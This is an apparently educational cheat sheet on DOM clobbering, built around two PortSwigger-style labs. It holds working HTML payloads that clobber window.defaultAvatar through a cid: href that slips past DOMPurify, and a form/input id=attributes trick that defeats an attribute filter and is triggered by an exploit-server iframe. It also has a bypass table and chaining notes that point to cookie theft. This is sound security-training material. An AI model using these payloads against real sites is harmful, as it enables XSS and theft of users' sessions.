# DOM-based vulnerabilities - DOM clobbering

DOM clobbering exploits the browser behavior where HTML elements with `id` or `name` attributes create properties on the global `window` object (and on their parent collections). An attacker who can inject HTML - but not `<script>` tags (e.g., a comment field with a sanitizer) - can **clobber** a global JS variable or object property, redirecting logic to attacker-controlled values, often triggering XSS.

## Quick reference
```html
<!-- Clobber window.x with an anchor element -->
<a id=x href="javascript:alert(1)">

<!-- Clobber window.defaultAvatar (global variable) -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
<!-- Two anchors with same id form a collection; name=avatar accesses .avatar property -->
<!-- cid: protocol not URL-encoded by DOMPurify -> double-quote decoded at runtime -->

<!-- Clobber form.attributes to bypass HTML filter -->
<form id=x tabindex=0 onfocus=print()><input id=attributes>
<!-- input#attributes clobbers form.attributes -> attributes.length = undefined -> filter skips attribute removal -->
<!-- trigger focus via iframe fragment: -->
<iframe src="https://LAB/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

## Root cause
The browser maps named HTML elements to global properties:
- `<div id=foo>` -> `window.foo` = that element
- Two elements with same `id` -> DOM collection
- `name=bar` on second element -> `collection.bar` = that element's properties

JS code like `let x = window.x || {prop: 'default'}` is clobberable if an attacker inserts `<a id=x name=prop href="...">` into the DOM - `window.x` now points to the anchor, and `window.x.prop` is the href.

## Find it
1. Look for JS patterns: `window.varName || {prop: 'default'}` - if varName is not defined in JS, it can be clobbered by HTML.
2. Look for `filter.attributes.length` or similar property-based iteration in sanitizer code - if `attributes` is a named element, `.length` becomes undefined.
3. Check if HTML injection is possible without `<script>` (comments, profile, bio fields with DOMPurify-like sanitizers).
4. Check page source for `const x = window.x` where `window.x` might be undefined at load time.

## Technique

**Lab 1 - Clobber global variable to inject into img src:**
1. Page JS: `let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`.
2. `defaultAvatar.avatar` is later used as an img `src` attribute value.
3. `window.defaultAvatar` is undefined by default -> clobberable.
4. Anchor with matching id: `<a id=defaultAvatar>` -> `window.defaultAvatar` now = this anchor.
5. Two anchors with same id form a collection; `name=avatar` on second -> `defaultAvatar.avatar` = second anchor's href.
6. DOMPurify allows `cid:` protocol (doesn't encode `"`), so inject: `href="cid:&quot;onerror=alert(1)//"`.
7. At runtime, `&quot;` decoded -> `"` -> href = `cid:"onerror=alert(1)//` -> img src = `cid:"onerror=alert(1)//` -> `"` terminates src attribute -> `onerror=alert(1)` fires.
8. Inject via blog comment (first comment sets up clobber). Post a second comment to trigger page reload and use the clobbered variable.

Payload injected as comment: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

**Lab 2 - Clobber `attributes` property to bypass HTML filter:**
1. Page uses a library that sanitizes HTML by iterating `element.attributes` with `for(let i=0; i<el.attributes.length; i++)` to remove dangerous attributes.
2. Inject `<form id=x tabindex=0 onfocus=print()><input id=attributes>` - `<input id=attributes>` clobbers `form.attributes`.
3. Now `form.attributes.length` is undefined (it's an HTMLInputElement, not an Attr collection) -> the for-loop never runs -> `onfocus=print()` is NOT removed.
4. The form is stored in the comment. Need victim to focus on `#x`.
5. Deliver via exploit server iframe with 500ms delayed fragment navigation:
   `<iframe src="https://LAB/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)">`.
6. 500ms delay: lets the page fully load the comment (with the malicious form). Then appending `#x` focuses `<form id=x>` -> `onfocus=print()` fires.

## Payload arsenal
```html
<!-- Lab 1: clobber window.defaultAvatar.avatar -->
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

<!-- Lab 2: clobber form.attributes + trigger via iframe -->
<!-- Comment payload: -->
<form id=x tabindex=0 onfocus=print()><input id=attributes>

<!-- Exploit server iframe: -->
<iframe src="https://LAB/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

## Bypasses
| Defense | Bypass |
|---|---|
| DOMPurify blocks `<script>` | Inject `<a>` tags - DOMPurify allows them; clobber via id/name/href |
| DOMPurify disallows `javascript:` | Use `cid:` protocol - not URL-encoded by DOMPurify; double-quote in href survives |
| HTML filter removes event handlers | Clobber `attributes` -> `attributes.length` = undefined -> filter skips iteration |
| No user-triggerable JS events | iframe with delayed fragment navigation forces focus -> `onfocus` fires |

## Exploitation walkthrough
**Lab 1:** Post comment `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`. On next page load, JS reads `defaultAvatar.avatar` = `cid:"onerror=alert(1)//` -> img src renders -> `"` terminates src -> `onerror` fires. Need 2nd comment to re-trigger the page load after clobber is set.

**Lab 2:** Post comment `<form id=x tabindex=0 onfocus=print()><input id=attributes>`. Exploit server delivers iframe that appends `#x` after 500ms -> page focuses `<form id=x>` -> `onfocus=print()` fires (filter failed to remove it because `attributes.length` was undefined).

## Chaining
- DOM clobbering -> arbitrary JS execution -> [Exploiting-XSS](../../XSS/Exploiting-XSS/) (cookie theft, CSRF bypass).
- Particularly useful when only HTML injection available (no `<script>`): bypass DOMPurify and similar.
- Can chain with [Prototype-pollution](../../Prototype-pollution/) to escalate impact.

## Tools
- **Browser DevTools (Console)** - test `window.x` before/after injecting anchor to verify clobbering
- **Burp DOM Invader** - includes DOM clobbering detection mode
- **Exploit server** - host iframe with fragment navigation timing

## Labs

### Exploiting DOM clobbering to enable XSS [Expert]
`window.defaultAvatar || {avatar: '...'}` -> clobber with `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`. DOMPurify allows `cid:` -> double-quote survives -> img src terminates -> onerror fires. Key insight: DOMPurify's protocol allowlist creates a clobbering vector; `cid:` bypasses URL encoding.

### Clobbering DOM attributes to bypass HTML filters [Expert]
`<form id=x tabindex=0 onfocus=print()><input id=attributes>` - `<input id=attributes>` makes `form.attributes` point to the input, not the attributes collection -> `attributes.length` = undefined -> filter loop never runs -> `onfocus` retained. Triggered via iframe fragment (`#x`) with 500ms delay. Key insight: HTML named elements clobber DOM API properties, not just JS variables.

## Real-world notes
- DOM clobbering bypasses DOMPurify (and similar) in specific patterns - the security community actively discovers new bypasses.
- The `id=attributes` technique bypasses multiple real-world sanitizers including older DOMPurify versions.
- Always check for `window.x || defaultValue` patterns in code that uses inline HTML - they're universally clobberable.

## References
- https://portswigger.net/web-security/dom-based/dom-clobbering
- https://portswigger.net/research/dom-clobbering-strikes-back
